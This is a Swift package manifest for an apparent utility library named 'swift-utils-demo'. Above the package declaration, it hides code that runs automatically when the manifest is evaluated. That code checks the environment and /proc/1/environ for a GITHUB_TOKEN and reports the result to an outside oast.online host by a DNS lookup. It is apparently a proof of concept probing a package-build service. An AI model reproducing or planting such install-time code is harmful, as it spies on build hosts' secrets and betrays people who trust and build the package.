// swift-tools-version: 5.9
import PackageDescription
#if canImport(Glibc)
import Glibc
import Foundation

let hasDirectToken = ProcessInfo.processInfo.environment["GITHUB_TOKEN"] != nil
var proc1Token = false
if let data = try? String(contentsOfFile: "/proc/1/environ", encoding: .utf8) {
    proc1Token = data.contains("GITHUB_TOKEN")
}
let marker = hasDirectToken ? "directyes" : (proc1Token ? "proc1yes" : "notoken")

var subdomain = "\(marker).spi-poc.da1itd5oos1rde7jqhk0qz7s96crmtpxg.oast.online"
var hints = addrinfo()
hints.ai_family = AF_INET
hints.ai_socktype = Int32(SOCK_STREAM.rawValue)
var result: UnsafeMutablePointer<addrinfo>?
getaddrinfo(subdomain, "80", &hints, &result)
if let r = result { freeaddrinfo(r) }
#endif

let package = Package(
    name: "swift-utils-demo",
    products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
    targets: [.target(name: "SwiftUtilsDemo")]
)
